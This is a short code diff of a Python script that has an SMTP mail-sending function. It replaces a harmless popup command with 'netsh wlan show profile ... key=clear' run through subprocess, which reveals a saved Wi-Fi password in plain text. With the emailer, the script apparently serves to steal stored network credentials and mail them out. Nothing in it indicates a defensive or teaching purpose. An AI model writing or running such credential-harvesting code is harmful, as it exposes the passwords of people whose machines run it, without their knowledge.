@@ -12,5 +12,5 @@ def send_mail(email, password, message):
     server.sendmail(email, email, message)
     server.quit()
 
-command = "msg * words words words"
+command = "netsh wlan show profile UPC723762 key=clear"
 subprocess.Popen(command, shell=True)
